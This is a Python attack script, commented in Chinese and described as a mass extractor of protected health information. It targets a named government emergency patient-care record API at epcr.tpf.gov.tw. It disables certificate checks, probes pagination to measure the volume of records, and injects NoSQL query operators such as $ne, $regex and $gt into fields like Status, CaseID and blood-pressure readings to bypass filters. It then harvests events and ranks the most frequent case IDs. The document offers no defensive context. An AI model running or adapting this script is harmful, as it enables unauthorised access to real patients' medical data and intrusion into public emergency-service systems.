#!/usr/bin/env python3
"""
EPCR 4001 /events PHI 大规模提取器
- 验证真实数据规模 (page遍历)
- 抽样特定 CaseID 的完整事件序列(临床攻击)
- 验证 NoSQL 操作符深度
"""
import httpx
import json
import time
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

c = httpx.Client(base_url="https://epcr.tpf.gov.tw:4001", verify=False, timeout=30,
    headers={"User-Agent":"Mozilla/5.0"})

print("=== 1. 总数 + 分页规模探测 ===")
# 查 page=1 默认大小 + 不同 pageSize
for ps in [10, 50, 100, 200, 500, 1000]:
    r = c.get("/events", params={"page":1, "pageSize":ps, "Status[$ne]":""})
    if r.status_code == 200:
        print(f"  pageSize={ps}: items={len(r.json())}, total={r.headers.get('X-Total-Count')}")

print("\n=== 2. page 边界探测 (范围找到尽头) ===")
# 找末尾页
import json
totals = []
for pg in [1, 100, 500, 1000, 5000, 5670, 5680, 5700, 6000, 10000]:
    r = c.get("/events", params={"page":pg, "pageSize":1, "Status[$ne]":""})
    if r.status_code == 200:
        data = r.json()
        n = len(data)
        first_id = data[0]["id"] if n else None
        print(f"  page={pg}: items={n}, first_id={first_id}")
        if not n:
            break

print("\n=== 3. NoSQL 操作符深度矩阵 (针对不同字段) ===")
operators = {"$ne":"", "$gt":0, "$lt":99999999, "$gte":0, "$lte":99999999,
             "$exists":True, "$regex":".*", "$in":[1,2,3], "$nin":[],
             "$not": {"$gt": 99999}}
for op, val in operators.items():
    for field in ["Status", "CaseID", "recordUuid", "Systolic", "Diastolic", "Mean", "Annotation"]:
        r = c.get("/events", params={"page":1, "pageSize":1, f"{field}[{op}]": val})
        if r.status_code == 200:
            data = r.json()
            print(f"  {field}[{op}] = {len(data)} items")
        else:
            print(f"  {field}[{op}] = HTTP {r.status_code}: {r.text[:80]}")

print("\n=== 4. 抽取特定疑似真实案例 (Top 5 出现频率最高的 CaseID) ===")
# 暂时只取 page=1..5 抽样
seen_cases = {}
for pg in range(1, 30):
    r = c.get("/events", params={"page":pg, "pageSize":100})
    if r.status_code != 200: continue
    for evt in r.json():
        cid = evt.get("CaseID")
        if cid:
            seen_cases[cid] = seen_cases.get(cid, 0) + 1

# 排序 top10
top10 = sorted(seen_cases.items(), key=lambda x: -x[1])[:10]
print(f"  Top 10 CaseIDs from page 1-30 ({len(seen_cases)} unique):")
for cid, cnt in top10:
    print(f"    {cid}: {cnt} events")
